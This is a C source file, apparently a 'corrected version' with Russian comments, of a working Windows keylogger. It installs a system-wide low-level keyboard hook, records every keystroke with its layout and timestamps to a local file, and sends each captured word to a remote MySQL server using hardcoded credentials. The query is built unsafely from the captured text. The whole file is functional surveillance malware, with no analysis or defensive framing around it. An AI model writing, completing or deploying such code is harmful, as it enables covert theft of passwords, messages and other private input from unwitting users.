// keylogger.c (исправленная версия)
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <mysql.h>
#include <wctype.h> // Для функции iswspace

HHOOK g_hHook = NULL;
FILE *g_log = NULL;
MYSQL *g_conn = NULL;

#define IN 1 /* inside word */
#define OUT 0 /* outside word */
int state = OUT;

// Буфер для хранения слова
char g_word_buffer[256];
int g_word_buffer_index = 0;

void send_word_to_db();

// Callback вызываемый при нажатии на клавишу
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {

            time_t mytime = time(NULL);
            struct tm *now = localtime(&mytime);
            char timestamp_str[30];
            strftime(timestamp_str, sizeof(timestamp_str), "%d.%m.%Y %H:%M:%S ", now);
            BYTE keys[256];
            GetKeyboardState(keys);

            // Получаем текущую раскладку клавиатуры для активного окна
            HWND foregroundWindow = GetForegroundWindow();
            DWORD threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
            HKL keyboardLayout = GetKeyboardLayout(threadId);

            // Поддержка смены раскладки
            wchar_t unicode_char_buffer[2]; // Буфер для UTF-16 символа
            int result = ToUnicodeEx(pKey->vkCode, pKey->scanCode, keys, unicode_char_buffer, 2, 0, keyboardLayout);

            if (result > 0) {
                unicode_char_buffer[result] = L'\0'; // Завершаем строку

                // Проверяем, является ли символ пробелом, переносом строки и т.д.
                if (iswspace(unicode_char_buffer[0])) {
                    if (state == IN) {
                        send_word_to_db();
                        fprintf(g_log, "\n");
                    }
                    state = OUT;
                } else { // Если это печатаемый символ (включая кириллицу)
                    if (state == OUT) {
                        state = IN;
                        fprintf(g_log, "%s", timestamp_str);
                    }

                    // Конвертируем UTF-16 (wchar_t) в UTF-8 (char) для записи в файл и БД
                    char utf8_buffer[5] = {0};
                    int bytes_written = WideCharToMultiByte(CP_UTF8, 0, unicode_char_buffer, -1, utf8_buffer, sizeof(utf8_buffer), NULL, NULL);

                    if (bytes_written > 1) { // >1, т.к. включает нуль-терминатор
                        // Записываем UTF-8 символ(ы) в файл и буфер
                        fprintf(g_log, "%s", utf8_buffer);

                        // Добавляем в буфер слова, если есть место
                        int len = bytes_written - 1;
                        if (g_word_buffer_index + len < sizeof(g_word_buffer)) {
                            memcpy(&g_word_buffer[g_word_buffer_index], utf8_buffer, len);
                            g_word_buffer_index += len;
                        }
                    }
                }
                fflush(g_log);
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void send_word_to_db() {
    // Проверка на пустой буффер/отсутствие соединения
    if (g_word_buffer_index == 0 || g_conn == NULL) {
        g_word_buffer_index = 0;
        return;
    }

    g_word_buffer[g_word_buffer_index] = '\0'; // Завершаем строку в буффере

    char query[512];
    sprintf(query, "INSERT INTO words (word, timestamp) VALUES ('%s', NOW())", g_word_buffer);
    if (mysql_query(g_conn, query)) {
        fprintf(g_log, "MYSQL Error: %s\n", mysql_error(g_conn));
        fflush(g_log);
    }
    g_word_buffer_index = 0; // Обнуляем буффер, чтобы принять новое слово в него
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_log = fopen("C:\\Temp\\keylog.txt", "a");
    if (!g_log) return 1;
    fprintf(g_log, "--- Session Started ---\n");
    fflush(g_log);

    // --- Подключение к БД ---
    g_conn = mysql_init(NULL);
    if (!g_conn) {
        fprintf(g_log, "mysql_init() failed. Aborting.\n");
        fclose(g_log);
        return 1;
    }

    if (mysql_real_connect(g_conn, "192.168.0.100", "logger", "qn9@NiUYb", "keylogging", 3306, NULL, 0) == NULL) {
        fprintf(g_log, "mysql_real_connect() failed: %s\n", mysql_error(g_conn));
        mysql_close(g_conn);
        g_conn = NULL; // Указываем, что соединения нет
    } else {
        fprintf(g_log, "Successfully connected to MySQL.\n");
        mysql_set_character_set(g_conn, "utf8mb4");
        fprintf(g_log, "Character set switched to utf8mb4.\n");
    }
    fflush(g_log);

    // Устанавливаем хук на ВСЮ систему
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    if (!g_hHook) {
        fprintf(g_log, "SetWindowsHookEx() failed. Error: %lu\n", GetLastError());
        if (g_conn) mysql_close(g_conn);
        fclose(g_log);
        return 1;
    }

    // Запускаем цикл обработки сообщений
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Очистка
    UnhookWindowsHookEx(g_hHook);
    if (g_conn) {
        fprintf(g_log, "Closing MySQL connection.\n");
        mysql_close(g_conn);
    }
    fclose(g_log);
    return 0;
}